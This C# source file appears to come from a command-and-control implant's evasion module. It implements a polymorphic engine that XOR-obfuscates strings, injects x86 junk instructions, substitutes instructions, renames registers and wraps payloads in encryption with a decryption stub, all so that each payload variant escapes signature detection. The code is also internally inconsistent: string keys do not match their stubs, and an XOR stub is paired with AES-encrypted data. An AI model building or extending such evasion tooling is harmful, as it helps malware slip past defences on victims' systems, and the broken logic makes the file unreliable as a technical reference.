using System.Security.Cryptography;
using System.Text;

namespace SeraphC2.Implant.Core.Evasion;

/// <summary>
/// Implements polymorphic code generation to create unique variants of payloads
/// </summary>
public class PolymorphicEngine : IPolymorphicEngine
{
    private readonly Random _random;
    private readonly string[] _junkInstructions;
    private readonly Dictionary<byte, byte[]> _instructionSubstitutions;

    public PolymorphicEngine()
    {
        _random = new Random();
        _junkInstructions = InitializeJunkInstructions();
        _instructionSubstitutions = InitializeInstructionSubstitutions();
    }

    public async Task<byte[]> GenerateVariantAsync(byte[] originalCode, PolymorphicOptions options = null)
    {
        options ??= new PolymorphicOptions();
        var variant = new byte[originalCode.Length];
        Array.Copy(originalCode, variant, originalCode.Length);

        try
        {
            // Apply string obfuscation
            if (options.ObfuscateStrings)
            {
                variant = await ObfuscateStringsAsync(variant);
            }

            // Add junk code
            if (options.AddJunkCode)
            {
                variant = await AddJunkCodeAsync(variant, options.JunkCodePercentage);
            }

            // Apply instruction substitution
            variant = ApplyInstructionSubstitution(variant);

            // Apply register renaming
            variant = ApplyRegisterRenaming(variant);

            // Encrypt with stub if requested
            if (options.EncryptPayload)
            {
                variant = await EncryptWithStubAsync(variant, options.EncryptionKey);
            }

            return variant;
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"Failed to generate polymorphic variant: {ex.Message}", ex);
        }
    }

    public async Task<byte[]> ObfuscateStringsAsync(byte[] payload)
    {
        try
        {
            var result = new List<byte>(payload);
            var stringPatterns = FindStringPatterns(payload);

            // Process each found string pattern
            foreach (var pattern in stringPatterns.OrderByDescending(p => p.Offset))
            {
                var obfuscatedString = ObfuscateString(pattern.Data);
                var decryptionStub = GenerateStringDecryptionStub(pattern.Data.Length, pattern.Key);

                // Replace original string with obfuscated version + decryption stub
                result.RemoveRange(pattern.Offset, pattern.Data.Length);
                result.InsertRange(pattern.Offset, decryptionStub.Concat(obfuscatedString));
            }

            return result.ToArray();
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"Failed to obfuscate strings: {ex.Message}", ex);
        }
    }

    public async Task<byte[]> AddJunkCodeAsync(byte[] payload, int junkPercentage = 10)
    {
        try
        {
            var result = new List<byte>(payload);
            var junkInsertions = CalculateJunkInsertions(payload.Length, junkPercentage);

            // Insert junk code at random positions
            for (int i = junkInsertions.Count - 1; i >= 0; i--)
            {
                var insertion = junkInsertions[i];
                var junkCode = GenerateJunkCode(insertion.Length);
                result.InsertRange(insertion.Position, junkCode);
            }

            return result.ToArray();
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"Failed to add junk code: {ex.Message}", ex);
        }
    }

    public async Task<byte[]> EncryptWithStubAsync(byte[] payload, byte[] key = null)
    {
        try
        {
            // Generate encryption key if not provided
            key ??= GenerateRandomKey(32);

            // Encrypt the payload
            var encryptedPayload = EncryptPayload(payload, key);

            // Generate decryption stub
            var decryptionStub = GenerateDecryptionStub(key, encryptedPayload.Length);

            // Combine stub and encrypted payload
            var result = new byte[decryptionStub.Length + encryptedPayload.Length];
            Array.Copy(decryptionStub, 0, result, 0, decryptionStub.Length);
            Array.Copy(encryptedPayload, 0, result, decryptionStub.Length, encryptedPayload.Length);

            return result;
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"Failed to encrypt with stub: {ex.Message}", ex);
        }
    }

    #region Helper Methods

    private string[] InitializeJunkInstructions()
    {
        return new[]
        {
            "90", // NOP
            "40", // INC EAX
            "48", // DEC EAX
            "41", // INC ECX
            "49", // DEC ECX
            "42", // INC EDX
            "4A", // DEC EDX
            "50", // PUSH EAX
            "58", // POP EAX
            "51", // PUSH ECX
            "59", // POP ECX
            "52", // PUSH EDX
            "5A", // POP EDX
            "53", // PUSH EBX
            "5B", // POP EBX
            "8BC0", // MOV EAX, EAX
            "8BC9", // MOV ECX, ECX
            "8BD2", // MOV EDX, EDX
            "8BDB", // MOV EBX, EBX
            "33C0", // XOR EAX, EAX
            "33C9", // XOR ECX, ECX
            "33D2", // XOR EDX, EDX
            "33DB", // XOR EBX, EBX
            "03C0", // ADD EAX, EAX
            "2BC0", // SUB EAX, EAX
            "0BC0", // OR EAX, EAX
            "23C0", // AND EAX, EAX
        };
    }

    private Dictionary<byte, byte[]> InitializeInstructionSubstitutions()
    {
        return new Dictionary<byte, byte[]>
        {
            // MOV EAX, 0 -> XOR EAX, EAX
            [0xB8] = new byte[] { 0x33, 0xC0 }, // When followed by 0x00000000
            
            // PUSH EAX; POP EAX -> NOP; NOP
            [0x50] = new byte[] { 0x90, 0x90 }, // When followed by 0x58
            
            // ADD EAX, 1 -> INC EAX
            [0x83] = new byte[] { 0x40 }, // When followed by 0xC0, 0x01
            
            // SUB EAX, 1 -> DEC EAX
            [0x83] = new byte[] { 0x48 }, // When followed by 0xE8, 0x01
        };
    }

    private List<StringPattern> FindStringPatterns(byte[] payload)
    {
        var patterns = new List<StringPattern>();
        
        // Look for ASCII strings (simplified pattern matching)
        for (int i = 0; i < payload.Length - 4; i++)
        {
            if (IsAsciiString(payload, i, out int length) && length >= 4)
            {
                var stringData = new byte[length];
                Array.Copy(payload, i, stringData, 0, length);
                
                patterns.Add(new StringPattern
                {
                    Offset = i,
                    Data = stringData,
                    Key = (byte)_random.Next(1, 255)
                });
                
                i += length - 1; // Skip processed string
            }
        }

        return patterns;
    }

    private bool IsAsciiString(byte[] data, int offset, out int length)
    {
        length = 0;
        
        for (int i = offset; i < data.Length; i++)
        {
            var b = data[i];
            
            // Check if byte is printable ASCII
            if (b >= 32 && b <= 126)
            {
                length++;
            }
            else if (b == 0 && length > 0)
            {
                // Null terminator found
                return true;
            }
            else
            {
                // Non-ASCII character found
                break;
            }
        }

        return length >= 4; // Minimum string length
    }

    private byte[] ObfuscateString(byte[] stringData)
    {
        var key = (byte)_random.Next(1, 255);
        var obfuscated = new byte[stringData.Length];
        
        for (int i = 0; i < stringData.Length; i++)
        {
            obfuscated[i] = (byte)(stringData[i] ^ key);
        }

        return obfuscated;
    }

    private byte[] GenerateStringDecryptionStub(int stringLength, byte key)
    {
        // Generate x86 assembly stub to decrypt string in place
        var stub = new List<byte>();
        
        // PUSH ESI
        stub.Add(0x56);
        
        // MOV ESI, string_address (placeholder - will be patched at runtime)
        stub.AddRange(new byte[] { 0xBE, 0x00, 0x00, 0x00, 0x00 });
        
        // MOV ECX, string_length
        stub.Add(0xB9);
        stub.AddRange(BitConverter.GetBytes(stringLength));
        
        // XOR BYTE PTR [ESI], key
        stub.AddRange(new byte[] { 0x80, 0x36, key });
        
        // INC ESI
        stub.Add(0x46);
        
        // LOOP -4
        stub.AddRange(new byte[] { 0xE2, 0xFA });
        
        // POP ESI
        stub.Add(0x5E);

        return stub.ToArray();
    }

    private List<JunkInsertion> CalculateJunkInsertions(int payloadLength, int junkPercentage)
    {
        var insertions = new List<JunkInsertion>();
        var junkBytes = (payloadLength * junkPercentage) / 100;
        var numInsertions = _random.Next(junkBytes / 10, junkBytes / 2);

        for (int i = 0; i < numInsertions; i++)
        {
            insertions.Add(new JunkInsertion
            {
                Position = _random.Next(0, payloadLength),
                Length = _random.Next(2, 8)
            });
        }

        return insertions.OrderBy(x => x.Position).ToList();
    }

    private byte[] GenerateJunkCode(int length)
    {
        var junkCode = new List<byte>();
        
        while (junkCode.Count < length)
        {
            var instruction = _junkInstructions[_random.Next(_junkInstructions.Length)];
            var instructionBytes = Convert.FromHexString(instruction);
            
            if (junkCode.Count + instructionBytes.Length <= length)
            {
                junkCode.AddRange(instructionBytes);
            }
            else
            {
                // Fill remaining space with NOPs
                while (junkCode.Count < length)
                {
                    junkCode.Add(0x90); // NOP
                }
            }
        }

        return junkCode.ToArray();
    }

    private byte[] ApplyInstructionSubstitution(byte[] payload)
    {
        var result = new List<byte>(payload);
        
        // Apply simple instruction substitutions
        for (int i = 0; i < result.Count - 4; i++)
        {
            // MOV EAX, 0 -> XOR EAX, EAX
            if (result[i] == 0xB8 && 
                result[i + 1] == 0x00 && result[i + 2] == 0x00 && 
                result[i + 3] == 0x00 && result[i + 4] == 0x00)
            {
                result[i] = 0x33;     // XOR
                result[i + 1] = 0xC0; // EAX, EAX
                result.RemoveRange(i + 2, 3); // Remove the 0x00000000
                continue;
            }

            // PUSH EAX; POP EAX -> NOP; NOP
            if (result[i] == 0x50 && i + 1 < result.Count && result[i + 1] == 0x58)
            {
                result[i] = 0x90;     // NOP
                result[i + 1] = 0x90; // NOP
            }
        }

        return result.ToArray();
    }

    private byte[] ApplyRegisterRenaming(byte[] payload)
    {
        // Simple register renaming (EAX <-> ECX in some contexts)
        var result = new byte[payload.Length];
        Array.Copy(payload, result, payload.Length);

        var registerMap = new Dictionary<byte, byte>
        {
            [0xC0] = 0xC1, // EAX -> ECX in some MOV instructions
            [0xC1] = 0xC0, // ECX -> EAX in some MOV instructions
        };

        for (int i = 0; i < result.Length - 1; i++)
        {
            // Apply register renaming for MOV instructions
            if (result[i] == 0x8B) // MOV instruction
            {
                if (registerMap.TryGetValue(result[i + 1], out var newRegister))
                {
                    if (_random.Next(0, 100) < 30) // 30% chance to rename
                    {
                        result[i + 1] = newRegister;
                    }
                }
            }
        }

        return result;
    }

    private byte[] EncryptPayload(byte[] payload, byte[] key)
    {
        using var aes = Aes.Create();
        aes.Key = key;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.GenerateIV();

        using var encryptor = aes.CreateEncryptor();
        var encrypted = encryptor.TransformFinalBlock(payload, 0, payload.Length);

        // Prepend IV to encrypted data
        var result = new byte[aes.IV.Length + encrypted.Length];
        Array.Copy(aes.IV, 0, result, 0, aes.IV.Length);
        Array.Copy(encrypted, 0, result, aes.IV.Length, encrypted.Length);

        return result;
    }

    private byte[] GenerateDecryptionStub(byte[] key, int encryptedLength)
    {
        // Generate a more sophisticated decryption stub
        var stub = new List<byte>();

        // This is a simplified stub - a real implementation would include
        // full AES decryption code or use a simpler cipher
        
        // For demonstration, using XOR with rotating key
        var xorKey = key.Take(4).ToArray();
        
        // PUSH registers
        stub.AddRange(new byte[] { 0x60 }); // PUSHAD
        
        // MOV ESI, encrypted_data_address (placeholder)
        stub.AddRange(new byte[] { 0xBE, 0x00, 0x00, 0x00, 0x00 });
        
        // MOV ECX, encrypted_length
        stub.Add(0xB9);
        stub.AddRange(BitConverter.GetBytes(encryptedLength));
        
        // MOV EDX, 0 (key index)
        stub.AddRange(new byte[] { 0x33, 0xD2 });
        
        // Decryption loop
        // MOV AL, [ESI]
        stub.AddRange(new byte[] { 0x8A, 0x06 });
        
        // XOR AL, key[EDX % 4]
        stub.AddRange(new byte[] { 0x32, 0x82 });
        stub.AddRange(xorKey);
        
        // MOV [ESI], AL
        stub.AddRange(new byte[] { 0x88, 0x06 });
        
        // INC ESI
        stub.Add(0x46);
        
        // INC EDX
        stub.Add(0x42);
        
        // AND EDX, 3 (keep key index in range 0-3)
        stub.AddRange(new byte[] { 0x83, 0xE2, 0x03 });
        
        // LOOP back
        stub.AddRange(new byte[] { 0xE2, 0xF0 });
        
        // POP registers
        stub.AddRange(new byte[] { 0x61 }); // POPAD
        
        // JMP to decrypted code
        stub.AddRange(new byte[] { 0xEB, 0x00 }); // JMP +0 (will be patched)

        return stub.ToArray();
    }

    private byte[] GenerateRandomKey(int length)
    {
        var key = new byte[length];
        using var rng = RandomNumberGenerator.Create();
        rng.GetBytes(key);
        return key;
    }

    #endregion

    #region Helper Classes

    private class StringPattern
    {
        public int Offset { get; set; }
        public byte[] Data { get; set; } = Array.Empty<byte>();
        public byte Key { get; set; }
    }

    private class JunkInsertion
    {
        public int Position { get; set; }
        public int Length { get; set; }
    }

    #endregion
}